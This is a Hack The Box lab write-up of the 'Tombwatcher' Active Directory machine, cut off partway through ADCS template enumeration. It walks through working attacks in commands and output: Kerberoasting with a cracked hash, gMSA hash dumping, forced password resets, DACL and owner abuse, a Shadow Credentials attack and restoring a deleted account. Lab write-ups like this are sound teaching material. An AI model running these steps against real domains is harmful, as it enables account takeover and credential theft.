# Tombwatcher - HTB Labs Writeup

**Machine:** Tombwatcher (Windows AD)

**Difficulty:** Medium

<img width="989" height="197" alt="1" src="https://github.com/user-attachments/assets/53b3f301-94b2-4a4d-8a97-12a95b7af3af" />

## Background / Scope

-**Target IP:** `10.10.11.72`

-**Goal:** Obtain Administrator access on the machine in a lab environment.

-**Machine Info:** As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry / H3nry_987TGV!`

## Target Enumeration (nmap)

```text
nmap -sC -sV 10.10.11.72
```

```python
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-11 02:21 EST
Nmap scan report for 10.10.11.72
Host is up (0.83s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-11 11:22:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-11-11T11:24:08+00:00; +4h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-11T11:24:06+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2025-11-11T11:24:08+00:00; +4h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-11T11:24:06+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m00s, deviation: 0s, median: 4h00m00s
| smb2-time: 
|   date: 2025-11-11T11:23:25
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.36 seconds
```

As we can see, common Active Machine services are working on this machine.Add domain name to our `/etc/hosts/`

```text
10.10.11.72        tombwatcher.htb dc01.tombwatcher.htb
```

I see HTTP service is working on port `80(http)` and `5985(http)`.I opened up http on port 5985


<img width="1062" height="622" alt="2" src="https://github.com/user-attachments/assets/6ea3869d-e51a-4859-af24-5619700f9e3b" />

There is Simple Windows Server

## Directory Brute Force

I'll run gobuster to brute force any directory
```text
gobuster dir -u http://10.10.11.72 -w /usr/share/wordlists/dirb/common.txt  -x php,txt,json
```

```python
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.72
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,json
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 156] [--> http://10.10.11.72/aspnet_client/]                                                 
Progress: 14267 / 18452 (77.32%)^Z
zsh: suspended  gobuster dir -u http://10.10.11.72 -w /usr/share/wordlists/dirb/common.txt -x
```
I only found `/aspnet_client`, but I got `Forbidden: Access is Denied` on this page


## SMB Enumeration

I run `SMB` using our provided credentials

```text
crackmapexec smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --shares
```
```python
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [+] Enumerated shares
SMB         10.10.11.72     445    DC01             Share           Permissions     Remark
SMB         10.10.11.72     445    DC01             -----           -----------     ------
SMB         10.10.11.72     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.72     445    DC01             C$                              Default share
SMB         10.10.11.72     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.72     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.72     445    DC01             SYSVOL          READ            Logon server share                       
```

We see the default shares here

I'll run cme again to find what users name we can find here 
```text
crackmapexec smb 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --users
```
```python
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.10.11.72     445    DC01             [+] Enumerated domain user(s)
SMB         10.10.11.72     445    DC01             tombwatcher.htb\john                           badpwdcount: 0 desc: 
SMB         10.10.11.72     445    DC01             tombwatcher.htb\sam                            badpwdcount: 0 desc: 
SMB         10.10.11.72     445    DC01             tombwatcher.htb\Alfred                         badpwdcount: 0 desc: 
SMB         10.10.11.72     445    DC01             tombwatcher.htb\Henry                          badpwdcount: 1 desc: 
SMB         10.10.11.72     445    DC01             tombwatcher.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.10.11.72     445    DC01             tombwatcher.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.10.11.72     445    DC01             tombwatcher.htb\Administrator                  badpwdcount: 0 desc: Built-in account                                                                                         for administering the computer/domain  
```
So at least I found four usernames


I'll try to find something with `enum4linux` 
```python
enum4linux 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!
```

<img width="698" height="619" alt="4" src="https://github.com/user-attachments/assets/da62ba0f-6fc2-460f-a7dd-b7f5e3d05d37" />

I found nothing interesting here


## BloodHound

Let's run BloodHound using our provided credentials.First of all we need `.zip` file for uploading to BloodHound GUI

```text
bloodhound-python -u 'henry' -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c All --zip
```

I'll search our user `Henry`.I've already had usersname and find full path from `Henry` to `John`


<img width="683" height="355" alt="5" src="https://github.com/user-attachments/assets/e145677a-e065-4b05-a5ff-034ebbebc9f9" />

## Authentication as `Alfred`

I'll start with Henry and Alfred.The user `Henry` has the ability to write to the "serviceprincipalname" attribute to the user `Alfred`



<img width="726" height="248" alt="6" src="https://github.com/user-attachments/assets/96690a1c-239f-479a-ac8f-37a6e1f9ba89" />


If we have access to SPN of `Alfred` user, I can Kerberoasting attack to request TGT.I'll use `targetedKerberoasted.py` 

```text
python3 targetedKerberoast.py -v -d tombwatcher.htb -u henry -p H3nry_987TGV! --use-ldaps --dc-ip 10.10.11.72
```

```python
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$9fa8b60e121bd230b411c3a08c6916ab$75f34546c0bad3ed1717502c9f12f72c7713f0a14dd41877875340998d02ffad78f87bdf4daf80062f133a7b09492563bbf96d61626851444717b305dc913c9323fcb6ac47374e89fb5b807568ce8ecb84e1367102575ba2262e139381073cc4793ab44d209b80b0abf5f2a6c1b818c347bb1ff409ff57cf80133148ec25cdc0b67fdb4ae4c33ed2ce1b6dd12a734c6864bf045851084e3527f4b754a0fcded55425081c2d51a647be826bfb48acc1116d6fa6c94d81307adcaa6c36f58b96383c93a25982f27a7a04a508a263d3d382609e7493c6e134d97f09721432b61f39ede23bed0d101d43eea65d78fd083ee840888cf4935ce3ecce1f4cadf8dc7a9091cb5a93b34d9cc5df9da5189fb3397c944677c769c449791f341e97c3a62d0081f92c1309f05534f22cdade9d762dc251710f2b2010b02570d79b7f8ac2cbf04787a333a50177b2fd7294e4d1592c4769d3a4f68ac917b68cab848c52f9af5b20c3cbb7026a6d051ea38f3b330253114983ccb6de1299fc8aedd107b82ee5e76510f63f3444fdcece52ba09d7c8a66ca55fdd8fbf81e48a89b1cbcc67fd5d31cab4b0d5adad0142c2f7d9411b9097958c0505fc6e4af4bd3f342df3964565b5f478783b92b87444692a96a25d9a40042c47addd0230f4ab0031d75fd572d6629cea9ed49a0808e4f5cbbaace6d3cb614867fe8e771830ef2c2c710f02199c34056767559fd51f8f90574818dfcc19aa1ca8f425024d503c5d978ee2f5201dc869a64ccbfa0dabfff31253f4bbdb964d8fa3ee5aba520df51193f1888032d8a0ea67a1bcced990fc2dc6b0566c8527b2c1725f0894950cb66c23ebb2f2c8d13aa447a603b80455181a48a0976c32afc9acf187cb4933e0f21b6e75ae581f89ec2f73a1566b35f4d6d1e902c0a4321b6b4b4e890fb05ba3ae0462cafc4fd584ab8a0c8dc27e085273e3d286b678956894779d3c190c7c4c2007db45167fd19b9cedb8a223fe0ba99e6f523c446ca50e8ce56dc7217998cb89c1815c90af553c616cd0cdca2fadf16955f33a145b965f700fa354f75562ca1df63a463975d64e519a3bdde108ef00c6c40916590c38f196758e72ef52fb4b8e37e55d1b84df609b7dd8884581449fc54ccc319735307d28830b0bb4e0130f6dcdb60d343776ecfd04ba62f2edbec4c07ec9b941a2b43cc1eec2781777aae2f076af42270b00e4cb9be50b12c652e062b8d07f4f4c502b6a313f2b2a70d2a2471e1856dd0d1996f6e403033d8ee63ace03bb27254a5e17fa9b8bd691003d099d8de42b85c09cc31e9b80c3a74f961d568038dc8077a07a0db7a10116a6304b3a6c13abcaffa3e9d17450d2dced129258f5a614a67f7ad018c4e71a9c55f39c70cb6255490671913e96a49e3a1f26a453853340453f32f3c93795ab36491ec264985d6927ecc7142bb59bbb3968f398d3753f93a26ce2bbd3229ee45c73
[VERBOSE] SPN removed successfully for (Alfred)
```
### Crack Hash
For cracking this hash I'll use `JohnTheRiiper`
```text
john --wordlist=/usr/share/wordlists/rockyou.txt alfred.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-11-11 06:58) 100.0g/s 1638Kp/s 1638Kc/s 1638KC/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
The cracked password is `basketball`

Check our creds:
```python
crackmapexec smb dc01.tombwatcher.htb -u alfred -p basketball
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\alfred:basketball 
```

But WinRM doesn't 

```python
crackmapexec winrm 10.10.11.72 -u alfred -p basketball
SMB         10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\alfred:basketball
```


## Authentication as `ansible_dev$`

The user `Alfred` has the ability to add itself, to the group `INFRASTRUCTURE`. Because of security group delegation, the members of a security group have the same privileges as that group.
By adding itself to the group, `Alfred` will gain the same privileges that `INFRASTRUCTURE` already has.After that as we already the member of `INFRASTRUCTURE`,we can get gMSA of user `ansible_dev$`



<img width="684" height="231" alt="9" src="https://github.com/user-attachments/assets/30485e7d-9e81-4060-a14e-67226262e009" />


When I tried to use `net rpc` to add Alfred to this group, it showed:

```test
net rpc group addmem 'INFRASTRUCTURE' 'alfred' -U 'alfred@tombwatcher.htb%basketball' -S 10.10.11.72
Could not add alfred to INFRASTRUCTURE: NT_STATUS_ACCESS_DENIED
```

So I'll try different way with `bloodyAD`
```test
─# bloodyAD --host "10.10.11.72" -d "tombwatcher" -u "alfred" -p "basketball" add groupMember "Infrastructure" "alfred"
[+] alfred added to Infrastructure
```
We successfully added `Alfred` to this group

```test
└─# net rpc group members "Infrastructure" -U tombwatcher.htb/alfred%'basketball' -S 10.10.11.72
TOMBWATCHER\Alfred
```

Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.gMSADumper.py can be used for that purpose.

```text
python3 gMSADumper.py -u alfred -p basketball -d tombwatcher.htb -l 10.10.11.72
```
```python
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::73009e35da7dcea73e835d695e76a836
ansible_dev$:aes256-cts-hmac-sha1-96:aa7df5cfa4812182382e302de4e327aa4ac5a8a1d8b2ef0186f947fff6eec0e8
ansible_dev$:aes128-cts-hmac-sha1-96:887b88f28a0a613ed6c79fd486e11406
```

I couldn't crack this GMSA using john or hashcat,but this hash works:

```python
crackmapexec smb 10.10.11.72 -u ansible_dev$ -H 73009e35da7dcea73e835d695e76a836
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ansible_dev$:73009e35da7dcea73e835d695e76a836 
```

But still don't have Remote Desktop access via WinRM:

```python
crackmapexec winrm 10.10.11.72 -u ansible_dev$ -H 73009e35da7dcea73e835d695e76a836
SMB         10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
HTTP        10.10.11.72     5985   DC01             [*] http://10.10.11.72:5985/wsman
WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\ansible_dev$:73009e35da7dcea73e835d695e76a836
```


## Authentication as SAM 

As we can see, user `ansible_dev$` have `ForceChangePassword` rights over `SAM`



<img width="701" height="214" alt="10" src="https://github.com/user-attachments/assets/0553af79-4002-4b7b-ae57-35b43c631f0a" />


The user `ansible_dev$` has the capability to change the user `SAM`'s password without knowing that user's current password.

To do this:
```python
bloodyAD -d tombwatcher.htb -u 'ANSIBLE_DEV$' -p ':73009e35da7dcea73e835d695e76a836' --host dc01.tombwatcher.htb set password "sam" "Hala Madrid"
```

We have successfully changed the password

```python
crackmapexec smb 10.10.11.72 -u sam -p 'Hala Madrid'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:Hala Madrid
```

## Authentication as `John`

Last step is the user `Sam` has `WriteOwner` right over the user `John`

<img width="783" height="231" alt="11" src="https://github.com/user-attachments/assets/da04e699-4e29-4bbe-a288-73a6189d39b8" />

To do this, we need to make `Sam` the owner of `John` using Impacket `owneredit`
```python
└─# impacket-owneredit -action write -new-owner 'sam' -target 'john' -dc-ip 10.10.11.72 'tombwatcher.htb'/sam:'Hala Madrid'
Impacket v0.13.0.dev0+20250721.105211.75610382 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
To abuse ownership of a user object, you may grant yourself the GenericAll privilege.
Impacket's `dacledit` can be used for that purpose

```python
impacket-dacledit -action 'write' -rights 'FullControl' -principal sam -target john 'tombwatcher.htb'/'sam':'Hala Madrid' -dc-ip 10.10.11.72 
Impacket v0.13.0.dev0+20250721.105211.75610382 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20251111-075843.bak
[*] DACL modified successfully!
```

### Shadow Credentials attack

To abuse this privilege, I'll use `certipy`

```python
└─# certipy shadow auto -u sam@tombwatcher.htb -p 'Hala Madrid' -target 'dc01.tombwatcher.htb' -account 'john' -dc-ip 10.10.11.72 -k
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2a17999b-acf5-b7d8-975d-8e281b9d86ba'
[*] Adding Key Credential with device ID '2a17999b-acf5-b7d8-975d-8e281b9d86ba' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '2a17999b-acf5-b7d8-975d-8e281b9d86ba' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Using principal: john@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': ad9324754583e3e42b55aad4d3b8d2
```
Now we got NT hash for `John`

Our NT hash works
```python
crackmapexec smb dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf
```

Finally WinRM works

```python
crackmapexec winrm dc01.tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) 
WINRM       10.10.11.72     5985   DC01             [+] tombwatcher.htb\john:ad9324754583e3e42b55aad4d3b8d2bf (Pwn3d!)
```

## Authentication as `cert_admin`

So I found John has `GenericAll` rights over `ADCS@TOMBWATCHER.HTB` OU.


<img width="699" height="209" alt="12" src="https://github.com/user-attachments/assets/f4578c22-af75-43bb-994c-2298d692f455" />

I run `certipy` to find any template vulnerability

```python
certipy find -target dc01.tombwatcher.htb -u john -hashes :ad9324754583e3e42b55aad4d3b8d2bf
Certipy v5.0.2 - by Oliver Lyak (ly4k)
                                                                                      
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20250612160945_Certipy.txt'
[*] Wrote text output to '20250612160945_Certipy.txt'
[*] Saving JSON output to '20250612160945_Certipy.json'
[*] Wrote JSON output to '20250612160945_Certipy.json'
```

If we take a look at this file, we can see:

```python

Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Computers
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

### Findings — Enroll rights.

I have enrollment rights for the machine account `ANSIBLE_DEV$` (a computer account that is a member of Domain Computers). `certipy` flags that these enrollment rights could be useful for `ESC2/ESC3-style` attacks, but in themselves they do not guarantee escalation — a vulnerable template or an additional weakness is required (for example, a schema v1 template with `“Enrollee supplies subject”` enabled, or `an Enrollment / Certificate Request Agent role`). The User template is also available via Domain Users. Additionally, the `WebServer` template looks interesting and should be inspected closely for schema version, the Enrollee supplies subject flag, and the template ACLs (who can Enroll).


```python

Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions            
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
      Object Control Permissions        
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          S-1-5-21-1392491010-1358638721-2126982587-1111
```

I found `SID` in `WebServer`, but there is no any information who is SID.I run this command on `John`'s machine

```python
Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties *
```
It output nothing, so maybe this means this user have been deleted.When I run with `-IncludeDelete
dObjects` it shows up:

```python
PS C:\Users\john\Documents> Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDelete
dObjects


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     : 
DisplayName                     : 
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted 
                                  Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/12/2025 9:08:34 AM, 11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 
                                  7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
lastLogonTimestamp              : 134074301665085824
logonCount                      : 0
Modified                        : 11/12/2025 9:22:00 AM
modifyTimeStamp                 : 11/12/2025 9:22:00 AM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 134074301501335398
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 95339
uSNCreated                      : 13186
whenChanged                     : 11/12/2025 9:22:00 AM
whenCreated                     : 11/16/2024 12:07:04 PM
```


If John has `GenericAll` rights over `ADCS` and only `ADCS` user we can possibly get access to is our deleted user `cert_admin`.We need to restore this user.To do this, we need `cert_admin` `ObjectGUID`

```python
evil-winrm-py PS C:\Users\john\Documents> Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

Now run our previous command with our SID with no `-IncludeDelete dObjects`

```python
evil-winrm-py PS C:\Users\john\Documents> Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/ADCS/cert_admin
CN                              : cert_admin
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : 
Description                     : 
DisplayName                     : 
DistinguishedName               : CN=cert_admin,OU=ADCS,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/12/2025 3:32:43 PM, 11/12/2025 9:08:34 AM, 11/16/2024 12:07:10 PM, 11/16/2024 
                                  12:07:08 PM...}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : 
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
lastLogonTimestamp              : 134074301665085824
logonCount                      : 0
Modified                        : 11/12/2025 3:32:43 PM
modifyTimeStamp                 : 11/12/2025 3:32:43 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : CN=Person,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 134074301501335398
sAMAccountName                  : cert_admin
sAMAccountType                  : 805306368
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 95542
uSNCreated                      : 13186
whenChanged                     : 11/12/2025 3:32:43 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

As we can see, It worked

### Reset the password

To reset our user password, we do:
```
Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'RealMadrid' -AsPlainText -Force)
```

```python
crackmapexecsmb dc01.tombwatcher.htb -u cert_admin -p 'RealMadrid'
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\cert_admin:RealMadrid
```


After we successfuly reset the password of `cert_admin`, we can run `certipy` again as cert_admin

```python
certipy find -target dc01.tombwatcher.htb -u cert_admin -p 'RealMadrid' -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
